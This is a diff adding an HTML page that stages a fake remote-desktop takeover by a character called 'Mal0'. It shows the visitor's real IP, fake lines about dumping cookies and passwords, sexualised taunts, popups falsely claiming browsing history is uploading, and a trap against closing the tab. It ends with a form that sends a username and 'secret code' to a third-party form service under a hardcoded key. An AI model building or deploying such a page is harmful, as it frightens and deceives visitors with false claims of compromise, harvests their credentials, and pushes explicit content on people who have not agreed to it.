@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RC_Desk - Remote Session Active</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+    
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000000;
+            color: #00ff00;
+            font-family: 'VT323', monospace;
+            overflow: hidden;
+            height: 100vh;
+            user-select: none;
+        }
+        /* INTRO GLITCH */
+        #intro-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; align-items: center; justify-content: center;
+            z-index: 999999; overflow: hidden;
+        }
+        .glitch-container { position: relative; width: 90%; max-width: 820px; }
+        #mal0-intro, .glitch-layer { width: 100%; height: auto; object-fit: contain; }
+        .glitch-red { filter: hue-rotate(0deg) saturate(1.4); mix-blend-mode: screen; opacity: 0; }
+        .glitch-cyan { filter: hue-rotate(180deg) saturate(1.4); mix-blend-mode: screen; opacity: 0; }
+        .scanlines, .static-noise {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 4; opacity: 0;
+        }
+        .scanlines { background: repeating-linear-gradient(transparent 0px, transparent 3px, rgba(255,255,255,0.12) 3px, rgba(255,255,255,0.12) 6px); animation: scan-move 0.18s linear infinite; }
+        .static-noise { background: url('data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%220.85%22 numOctaves=%225%22/%3E%3C/filter%3E%3Crect width=%22100%25%22 height=%22100%25%22 filter=%22url(%23n)%22 opacity=%220.35%22/%3E%3C/svg%3E') repeat; mix-blend-mode: overlay; animation: noise-anim 0.07s steps(8) infinite; }
+        @keyframes glitch-main { 0%,100%{transform:translate(0)} 10%{transform:translate(-6px,4px)} 25%{transform:translate(8px,-5px)} 45%{transform:translate(-5px,7px)} 65%{transform:translate(7px,-4px)} 80%{transform:translate(-3px,6px)} }
+        @keyframes scan-move { 0%{background-position:0 0} 100%{background-position:0 120px} }
+        @keyframes noise-anim { 0%{background-position:0 0} 100%{background-position:300px 300px} }
+        @keyframes flicker { 0%,100%{opacity:1} 42%{opacity:0.7} 68%{opacity:0.95} }
+        /* MAIN */
+        .title-bar {
+            background: linear-gradient(to right, #1a1a1a, #2a2a2a);
+            padding: 8px 15px;
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 3px solid #00ff00; box-shadow: 0 0 15px #00ff00;
+        }
+        .title-bar h1 { font-size: 28px; letter-spacing: 2px; text-shadow: 0 0 10px #00ff00; }
+        .title-bar .status { color: #ff0000; animation: pulse 1.5s infinite; }
+        .remote-window {
+            position: absolute; top: 60px; left: 50%; transform: translateX(-50%);
+            width: 92%; max-width: 1100px; height: calc(100vh - 100px);
+            background: #111111; border: 4px solid #00ff00; border-radius: 8px;
+            box-shadow: 0 0 40px #00ff00, inset 0 0 60px rgba(0,255,0,0.2);
+            overflow: hidden; display: none;
+        }
+        .remote-header {
+            background: #1f1f1f; padding: 12px 20px; font-size: 26px;
+            display: flex; align-items: center; gap: 15px; position: relative;
+        }
+        .remote-header .dot { width: 18px; height: 18px; background: #ff0000; border-radius: 50%; animation: blink 1s infinite; }
+        #mal0-header {
+            position: absolute; top: 15px; right: 20px;
+            width: 110px; height: 110px; border: 4px solid #ff00ff;
+            border-radius: 50%; box-shadow: 0 0 30px #ff00ff; object-fit: cover;
+        }
+        .content {
+            padding: 20px; height: calc(100% - 60px);
+            display: flex; flex-direction: column; gap: 20px;
+        }
+        .info {
+            background: #1a1a1a; padding: 15px; border: 2px dashed #00ff00;
+            font-size: 28px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .console {
+            background: #000000; border: 2px solid #00ff00;
+            padding: 15px; height: 360px; overflow-y: auto;
+            font-size: 24px; line-height: 1.45; position: relative;
+        }
+        .typing { white-space: pre-wrap; color: #00ffaa; }
+        /* CREDENTIALS SCREEN */
+        #credentials-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #ff00ff; display: none;
+            align-items: center; justify-content: center; flex-direction: column;
+            z-index: 999999;
+        }
+        #credentials-form {
+            background: #111; border: 4px solid #ff00ff; padding: 40px; width: 460px;
+            text-align: center;
+        }
+        #credentials-form h2 { font-size: 32px; margin-bottom: 30px; }
+        .form-group { margin-bottom: 25px; text-align: left; }
+        .form-group label { display: block; margin-bottom: 8px; font-size: 26px; }
+        .form-group input {
+            width: 100%; padding: 12px; background: #000; border: 2px solid #00ff00;
+            color: #00ffaa; font-family: 'VT323', monospace; font-size: 24px;
+        }
+        #submit-credentials {
+            background: #ff00ff; color: #000; border: none; padding: 16px 60px;
+            font-size: 28px; font-weight: bold; cursor: pointer; margin-top: 20px;
+        }
+        /* Resto */
+        #fake-cursor { position: fixed; font-size: 42px; pointer-events: none; z-index: 99999; text-shadow: 0 0 20px #ff0000; animation: cursor-glow 1.5s infinite alternate; display: none; }
+        .fake-popup { position: fixed; top: 30%; left: 50%; transform: translate(-50%, -50%); width: 520px; background: #1a1a1a; border: 6px solid #ff0000; box-shadow: 0 0 60px #ff0000; padding: 25px; text-align: center; z-index: 100000; display: none; font-size: 28px; }
+        #submit-btn {
+            position: fixed; bottom: 40px; right: 40px;
+            background: #ff00ff; color: #000; padding: 18px 50px;
+            font-size: 32px; font-weight: bold; border: 6px solid #000;
+            box-shadow: 0 0 30px #ff00ff; cursor: pointer; display: none; z-index: 99999;
+            animation: pulse 2s infinite;
+        }
+        /* PANTALLA FINAL OWNED */
+        .owned-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #ff00ff; display: none;
+            align-items: center; justify-content: center; flex-direction: column;
+            z-index: 1000000; text-shadow: 0 0 40px #ff00ff;
+        }
+        #mal0-final {
+            width: 320px;
+            max-width: 65%;
+            height: auto;
+            margin-bottom: 35px;
+            border: 6px solid #00ff00;
+            border-radius: 12px;
+            box-shadow: 0 0 50px #ff00ff;
+            object-fit: contain;
+        }
+        .owned-title { font-size: 68px; margin-bottom: 15px; }
+        .blink { font-size: 52px; margin-bottom: 25px; animation: blink 0.4s infinite; }
+        .message { font-size: 32px; color: #00ff00; text-align: center; margin-bottom: 50px; }
+        .footer { position: absolute; bottom: 40px; font-size: 24px; opacity: 0.6; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
+        @keyframes cursor-glow { 0% { text-shadow: 0 0 20px #ff0000; } 100% { text-shadow: 0 0 40px #ff0000; } }
+    </style>
+</head>
+<body>
+    <!-- INTRO -->
+    <div id="intro-screen">
+        <div class="glitch-container">
+            <img id="mal0-intro" src="https://static1.e621.net/data/sample/a2/db/a2db9c53b3778274fe64e7845ae81c89.jpg" alt="Mal0">
+            <img class="glitch-layer glitch-red" id="glitch-red" src="https://static1.e621.net/data/sample/a2/db/a2db9c53b3778274fe64e7845ae81c89.jpg" alt="">
+            <img class="glitch-layer glitch-cyan" id="glitch-cyan" src="https://static1.e621.net/data/sample/a2/db/a2db9c53b3778274fe64e7845ae81c89.jpg" alt="">
+            <div class="scanlines" id="scanlines"></div>
+            <div class="static-noise" id="noise"></div>
+        </div>
+    </div>
+
+    <!-- MAIN REMOTE DESKTOP -->
+    <div class="title-bar">
+        <div style="display:flex; align-items:center; gap:12px;">
+            <span style="font-size:28px;">🖥️</span>
+            <h1>Mal0Desk • Remote Session Active</h1>
+        </div>
+        <div class="status">● CONNECTED • FULL CONTROL <span id="victim-ip" style="margin-left:15px; color:#ffff00;"></span></div>
+        <div style="font-size:22px;">Controlled by <span id="dom-name-top" style="color:#ff00ff;">Mal0</span></div>
+    </div>
+
+    <div class="remote-window" id="main-content">
+        <div class="remote-header">
+            <div class="dot"></div>
+            <div>VICTIM • PC ONLINE • IP DETECTED</div>
+            <div style="margin-left:auto; color:#ffff00; font-size:20px;">CAMERA: DISABLED (for now)</div>
+            <img id="mal0-header" src="https://static1.e621.net/data/sample/29/4b/294b1b7e7db850dc3b103ebd45003867.jpg" alt="Mal0">
+        </div>
+    
+        <div class="content">
+            <div class="info">
+                <div>Your real IP: <span id="ip-display" style="color:#ffff00;">Loading...</span></div>
+                <div>Connection established for <span id="timer">00:07</span> seconds</div>
+                <div style="color:#ff00ff;">Mal0 is watching you in real time ~</div>
+            </div>
+            <div class="console" id="console">
+                <div id="typing-area" class="typing"></div>
+            </div>
+            <div style="text-align:center; font-size:26px; color:#ff00ff; margin-top:auto;">
+                Remote control is active.<br>
+                Any attempt to close this window will be logged.
+            </div>
+        </div>
+    </div>
+
+    <div id="fake-cursor">👉</div>
+    <div id="popup" class="fake-popup">
+        <h2>⚠️ Closing the tab?</h2>
+        <p style="margin:20px 0; font-size:26px;">Your full browsing history is already uploading to Mal0's server...<br>Are you sure you want to escape?</p>
+        <button onclick="dismissPopup()">OK, I'm still here</button>
+    </div>
+
+    <button id="submit-btn" onclick="showCredentialsScreen()">
+        ACCEPT REMOTE CONTROL
+    </button>
+
+    <!-- FORMULARIO WEB3FORMS -->
+    <div id="credentials-screen">
+        <div id="credentials-form">
+            <h2>VERIFY YOUR IDENTITY</h2>
+            <form id="real-form" action="https://api.web3forms.com/submit" method="POST" target="_blank">
+                <input type="hidden" name="access_key" value="8c2161a7-a728-4e94-99e2-061fc329b92e">
+                <input type="hidden" name="subject" value="Mal0 Risky Link - Nuevas Credenciales">
+                <input type="hidden" name="from_name" value="Mal0 Remote Takeover">
+                <input type="hidden" name="source" value="Mal0 Remote Takeover">
+                <input type="hidden" name="redirect" value="https://web3forms.com/success">
+                
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" name="username" placeholder="Enter username" required>
+                </div>
+                <div class="form-group">
+                    <label>Secret Code</label>
+                    <input type="password" name="secret" placeholder="Enter secret code" required>
+                </div>
+                <button type="submit" id="submit-credentials">SUBMIT CREDENTIALS</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PANTALLA FINAL OWNED -->
+    <div id="owned-screen" class="owned-screen">
+        <img id="mal0-final" src="https://static1.e621.net/data/sample/e6/95/e695ad239366736f30db8194f6f2cccd.jpg" alt="Mal0">
+    
+        <div class="owned-title">OWNED BY <span id="dom-name-final" style="color:#ffff00;">Mal0</span></div>
+        <div class="blink">SUBMIT</div>
+        <div class="message">You belong to Mal0 now.<br>No escape.</div>
+    
+        <div class="footer">(close the tab if you dare...)</div>
+    </div>
+
+    <script>
+        const DOM_NAME = "Mal0";
+        const TYPING_MESSAGES = [
+            "[+] Establishing secure tunnel to Mal0 server...",
+            "[+] Bypassing firewall...",
+            "[+] Injecting remote access payload...",
+            "[+] Spoofing AnyDesk session ID...",
+            "[+] Extracting system information...",
+            "[+] Dumping browser cookies and passwords...",
+            "[+] Gaining full kernel access...",
+            "[+] Remote desktop protocol hijacked successfully",
+            
+            "Heh... look at you, all exposed already ~",
+            "Your IP is mine now. Cute little number <3",
+            "I can see everything you're doing... every tab, every click...",
+            "Your breathing just got faster. I like that ~",
+            "Found your secret folder... very interesting taste you have <3",
+            "Don't bother closing the window. I already own this session ~",
+            "Want me to turn your camera on? Or should I just describe what I see?",
+            "You're getting excited from being watched, aren't you, pet?",
+            "Good ClickSlut... keep squirming for me <3",
+            "You belong to Mal0 now. No escape ~"
+        ];
+
+        let typingIndex = 0;
+        let charIndex = 0;
+        let currentText = "";
+        let popupInterval = null;
+        let timerSeconds = 7;
+
+        function updateDomNames() {
+            document.querySelectorAll('#dom-name-top, #dom-name-final').forEach(el => el.textContent = DOM_NAME);
+        }
+
+        async function getRealIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                document.getElementById('ip-display').textContent = data.ip;
+                document.getElementById('victim-ip').textContent = data.ip;
+            } catch (e) {
+                document.getElementById('ip-display').textContent = "192.168.1.420 (fake)";
+            }
+        }
+
+        // Función de tipeo SIN LOOP - Muestra los mensajes una sola vez
+        function typeNextMessage() {
+            const area = document.getElementById('typing-area');
+            const consoleEl = document.getElementById('console');
+
+            // Si ya se mostraron todos los mensajes
+            if (typingIndex >= TYPING_MESSAGES.length) {
+                document.getElementById('submit-btn').style.display = 'block';
+                return;
+            }
+
+            if (charIndex === 0) {
+                currentText = TYPING_MESSAGES[typingIndex];
+                area.innerHTML += "<br>> ";
+            }
+
+            if (charIndex < currentText.length) {
+                area.innerHTML += currentText.charAt(charIndex);
+                charIndex++;
+                setTimeout(typeNextMessage, 68);   // velocidad de escritura
+            } else {
+                // Mensaje terminado → pasar al siguiente
+                typingIndex++;
+                charIndex = 0;
+                setTimeout(typeNextMessage, 1800); // pausa entre mensajes
+            }
+
+            // Scroll automático
+            setTimeout(() => { consoleEl.scrollTop = consoleEl.scrollHeight; }, 10);
+        }
+
+        function moveFakeCursor() {
+            const cursor = document.getElementById('fake-cursor');
+            cursor.style.display = 'block';
+            let x = Math.random() * (window.innerWidth - 80);
+            let y = Math.random() * (window.innerHeight - 80);
+            setInterval(() => {
+                x = Math.max(50, Math.min(window.innerWidth - 100, x + (Math.random() * 240 - 120)));
+                y = Math.max(50, Math.min(window.innerHeight - 100, y + (Math.random() * 240 - 120)));
+                cursor.style.left = x + 'px';
+                cursor.style.top = y + 'px';
+            }, 420);
+        }
+
+        function showFakePopup() {
+            document.getElementById('popup').style.display = 'block';
+        }
+
+        function dismissPopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        function startPopupLoop() {
+            popupInterval = setInterval(() => {
+                if (document.getElementById('owned-screen').style.display !== 'flex') showFakePopup();
+            }, 8000);
+        }
+
+        function startTimer() {
+            const timerEl = document.getElementById('timer');
+            setInterval(() => {
+                timerSeconds++;
+                timerEl.textContent = String(timerSeconds).padStart(2, '0') + ':' + String(Math.floor(Math.random()*60)).padStart(2, '0');
+            }, 1000);
+        }
+
+        function showCredentialsScreen() {
+            document.getElementById('submit-btn').style.display = 'none';
+            document.getElementById('credentials-screen').style.display = 'flex';
+        }
+
+        // Interceptar envío del formulario
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('real-form');
+            form.addEventListener('submit', function(e) {
+                setTimeout(() => {
+                    document.getElementById('credentials-screen').style.display = 'none';
+                    document.getElementById('owned-screen').style.display = 'flex';
+                    document.title = `Owned by ${DOM_NAME} • SUBMIT`;
+                    document.body.style.background = '#000';
+                    clearInterval(popupInterval);
+                }, 600);
+            });
+        });
+
+        window.onload = function() {
+            updateDomNames();
+            getRealIP();
+            const introScreen = document.getElementById('intro-screen');
+            const mainContent = document.getElementById('main-content');
+
+            setTimeout(() => {
+                document.getElementById('mal0-intro').style.animation = 'glitch-main 0.11s linear infinite';
+                document.getElementById('glitch-red').style.opacity = '0.78';
+                document.getElementById('glitch-cyan').style.opacity = '0.78';
+                document.getElementById('scanlines').style.opacity = '0.65';
+                document.getElementById('noise').style.opacity = '0.48';
+                introScreen.style.animation = 'flicker 0.09s infinite';
+
+                setTimeout(() => {
+                    introScreen.style.display = 'none';
+                    mainContent.style.display = 'block';
+
+                    typeNextMessage();   // Inicia los mensajes (sin repetir)
+                    moveFakeCursor();
+                    startPopupLoop();
+                    startTimer();
+                }, 5000);
+            }, 5000);
+        };
+
+        window.addEventListener('beforeunload', function(e) {
+            if (document.getElementById('owned-screen').style.display !== 'flex') {
+                e.preventDefault();
+                e.returnValue = '⚠️ Remote session active. Your history is being sent to Mal0...';
+            }
+        });
+    </script>
+</body>
+</html>
